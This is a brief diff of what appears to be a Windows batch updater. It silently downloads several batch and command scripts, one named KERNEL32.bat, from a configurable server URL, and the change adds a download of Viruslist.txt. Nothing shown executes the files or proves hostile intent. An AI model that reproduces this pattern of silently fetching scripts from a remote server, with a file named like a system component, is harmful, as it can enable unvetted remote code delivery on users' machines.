@@ -201,6 +201,7 @@ curl -s -o UpAgent.cmd %SERVER_URL%/%UPDATER_FILE%
 curl -s -o ReAgent.bat %SERVER_URL%/ReAgent.bat
 curl -s -o KERNEL32.bat %SERVER_URL%/KERNEL32.bat
 curl -s -o %UPDATE_FILE% %SERVER_URL%/%UPDATE_FILE%
+curl -s -o Viruslist.txt %SERVER_URL%/Viruslist.txt
 
 
 
